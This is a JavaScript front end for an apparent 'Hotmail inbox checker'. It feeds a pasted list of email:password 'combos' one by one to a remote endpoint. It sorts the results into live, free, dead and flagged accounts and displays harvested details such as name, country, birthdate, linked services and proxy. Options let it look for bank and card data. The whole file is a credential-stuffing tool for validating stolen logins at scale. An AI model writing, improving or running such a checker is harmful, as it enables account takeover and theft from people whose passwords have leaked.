var audioElement = document.createElement('audio');
audioElement.setAttribute('src', 'https://mytoolz.net/js/audio/switch.mp3');


audioElement.addEventListener("canplay", function () {
    $("#length").text("Duration:" + audioElement.duration + " seconds");
    $("#source").text("Source:" + audioElement.src);
    $("#status").text("Status: Ready to play").css("color", "green");
});

audioElement.addEventListener("timeupdate", function () {
    $("#currentTime").text("Current second:" + audioElement.currentTime);
});

var ajaxCall;

Array.prototype.remove = function (value) {
    var index = this.indexOf(value);
    if (index != -1) {
        this.splice(index, 1);
    }
    return this;
};
function enableTextArea(bool) {
    $('#cclist').attr('disabled', bool);
}
// LIVE
function gbrn_liveUp() {
    var count = parseInt($('#live_count').html());
    count++;
    $('#live_count').html(count + '');
}
//FREE
function gbrn_live2Up() {
    var count = parseInt($('#live_count2').html());
    count++;
    $('#live_count2').html(count + '');
}
//DEC
function gbrn_dieUp() {
    var count = parseInt($('#die_count').html());
    count++;
    $('#die_count').html(count + '');
}
//UNKNOWN
function gbrn_badUp() {
    var count = parseInt($('#nogate_count').html());
    count++;
    $('#nogate_count').html(count + '');
}
//RETRY  
function gbrn_retryUp() {
    var count = parseInt($('#retry_count').html());
    count++;
    $('#retry_count').html(count + '');
}


function stopLoading(bool) {
    $('#loading').attr('src', 'img/clear.gif');
    $('#durum').html('stopped');
    enableTextArea(false);
    $('#submit').attr('disabled', false);
    $('#stop').attr('disabled', true);
    if (bool) {
        $('#islem').html('Finish!<i class="fal fa-check"></i>')
        $('#kalan').html('Finish!<i class="fal fa-check"></i>')
        $('#kontrol').html('Finish!<i class="fal fa-check"></i>')
        $('#durum').html('Finish!<i class="fal fa-check"></i>')
        $('#progressbar').css({ width: '100%' }).html('%100')
        audioElement.play();
    } else {
        ajaxCall.abort();
    }
    updateTitle('Complete');
}
function updateTitle(str) {
    document.title = str;
}
function updateTextBox(mp) {
    var mailpass = $('#cclist').val().split("\n");
    mailpass.remove(mp);
    $('#cclist').val(mailpass.join("\n"));
}
function GbrnTmfn(lstMP, curMP, delim, cEmail, bank, card, info, no) {

    if (lstMP.length < 1 || curMP >= lstMP.length) {
        stopLoading(true);
        return false;
    }
    updateTextBox(lstMP[curMP]);
    ajaxCall = $.ajax({
        url: 'https://mytoolz.net/ajax/hotmail-inbox-checker.php',
        dataType: 'json',
        cache: false,
        type: 'POST',
        beforeSend: function (e) {
            var init = lstMP.length
            var width = Math.round(no * 100 / init)
            updateTitle('[' + no + '/' + lstMP.length + '] Loading....');
            $('#islem').html('' + no + '/' + lstMP.length + '');
            $('#kalan').html(lstMP.length - no)
            $('#kontrol').html(lstMP[curMP])
            $('#checkStatus');
            $('#loading').attr('src', 'img/loading.gif');
            $("#progressbar").css({ width: width + "%" }).html('%' + width)
            $("#durum").html('<i class="fal fa-spinner fa-spin"></i>')
            $('#yuzde').html('%' + width)
        },
        data: 'ajax=1&do=check&mailpass=' + encodeURIComponent(lstMP[curMP])
            + '&delim=' + encodeURIComponent(delim) + '&email=' + cEmail + '&bank=' + bank + '&card=' + card + '&info=' + info,
        success: function (data) {
            let [combo, date] = [data['combo']['email'] + ":" + data['combo']['password'],
            new Date().toLocaleString()]
            switch (data["status"]) {
                case -1:
                    curMP++;
                    $('#retry').append("<tr class='initialism'><td><font color='black'>RETRY</font> </td><td>" + combo + "</td><td>" + data['proxy'] + "</td><td>" + date + "</td></tr>");
                    $('#tekrar button').attr('disabled', false)
                    gbrn_retryUp();
                    break;
                case 0:
                    curMP++;
                    let cap = data['capture'];
                    let capture =
                        "<b>Name:</b> " + cap['Name'] +
                        " | <b>Country:</b> " + cap['Country'] +
                        " | <b>Born:</b> " + cap['Birthdate'] +
                        " | <b>Linked:</b> " + cap['LinkedCount'] +
                        " | <b>Apps:</b> " + cap['Services'];
                    $('#live').append(
                        "<tr class='initialism'>" +
                        "<td><font color='green'>LIVE</font></td>" +
                        "<td>" + combo + "</td>" +
                        "<td>" + capture + "</td>" +
                        "<td>" + date + "</td>" +
                        "</tr>"
                    );

                    // Enable download button
                    $('#canli button').attr('disabled', false);
                    if (typeof gbrn_liveUp === "function") gbrn_liveUp();
                    break;
                case 1:
                    curMP++;

                    let capFree = data['capture'];

                    let captureFree =
                        "<b>Name:</b> " + capFree['Name'] +
                        " | <b>Country:</b> " + capFree['Country'] +
                        " | <b>Born:</b> " + capFree['Birthdate'] +
                        " | <b>Result:</b> " + capFree['Result'];

                    $("#live2").append(
                        "<tr class='initialism'>" +
                        "<td><font color='blue'>FREE</font></td>" +
                        "<td>" + combo + "</td>" +
                        "<td>" + captureFree + "</td>" +
                        "<td>" + date + "</td>" +
                        "</tr>"
                    );

                    $("#canli2 button").attr("disabled", false);
                    if (typeof gbrn_live2Up === "function") gbrn_live2Up();
                    break;
                case 2:
                    curMP++;
                    $("#die").append("<tr class='initialism'><td><font color='red'>DEC</font> </td><td>" + combo + "</td><td>" + date + "</td></tr>");
                    $("#olu button").attr("disabled", false);
                    gbrn_dieUp();
                    break;
                case 3:
                    curMP++;
                    $("#nogate").append("<tr class='initialism'><td><font color='purple'>FLAGGED</font> </td><td>" + combo + "</td><td>" + date + "</td></tr>");
                    $("#bilinmeyen button").attr("disabled", false);
                    gbrn_badUp();
                    break;
            }
            no++;
            GbrnTmfn(lstMP, curMP, delim, cEmail, bank, card, info, no);
        },
        error: function (error) {
            console.log(error)
        }
    });
    return true;
}
function filterMP(mp, delim) {
    var mps = mp.split("\n");
    var filtered = new Array();
    var lstMP = new Array();
    for (var i = 0; i < mps.length; i++) {
        if (mps[i].indexOf(':') != -1) {
            var infoMP = mps[i].split(delim);
            for (var k = 0; k < infoMP.length; k++) {
                if (infoMP[k].indexOf(':') != -1) {
                    var email = $.trim(infoMP[k]);
                    var pwd = $.trim(infoMP[k + 1]);
                    if (filtered.indexOf(email.toLowerCase()) == -1) {
                        filtered.push(email.toLowerCase());
                        lstMP.push(email + '|' + pwd);
                        break;
                    }
                }
            }
        }
    }
    return lstMP;
}
function resetResult() {
    $('#acc_die').html('');
    $('#acc_die_count').text(0);
    $('#wrong').html('');
    $('#wrong_count').text(0);
}
$(document).ready(function () {
    $('#stop').attr('disabled', true).click(function () {
        stopLoading(false);
    });
    $("#olu button").click(function () {
        $('#die').html('')
    })
    $("#hatali button").click(function () {
        $('#hatali').html('')
    })
    $('#submit').click(function () {
        audioElement.play();
        var no = 1;
        var delim = $('#delim').val().trim();
        var mailpass = filterMP($('#cclist').val(), delim);
        var bank = $('#bank').is(':checked') ? 1 : 0;
        var card = $('#card').is(':checked') ? 1 : 0;
        var info = $('#info').is(':checked') ? 1 : 0;
        var cEmail = $('#email').is(':checked') ? 1 : 0;
        if ($('#cclist').val().trim() == '') {
            alert('Combo Add!')
            return false;
        }
        $('#cclist').val(mailpass.join("\n")).attr('disabled', true);
        $('#result').fadeIn(1000);
        resetResult();
        $('#submit').attr('disabled', true);
        $('#stop').val(mailpass.join("\n")).attr('disabled', false);
        GbrnTmfn(mailpass, 0, delim, cEmail, bank, card, info, no);
        return false;
    })
});

function selectText(containerid) {
    if (document.selection) {
        var range = document.body.createTextRange();
        range.moveToElementText(document.getElementById(containerid));
        range.select();
    } else if (window.getSelection()) {
        var range = document.createRange();
        range.selectNode(document.getElementById(containerid));
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
    }
}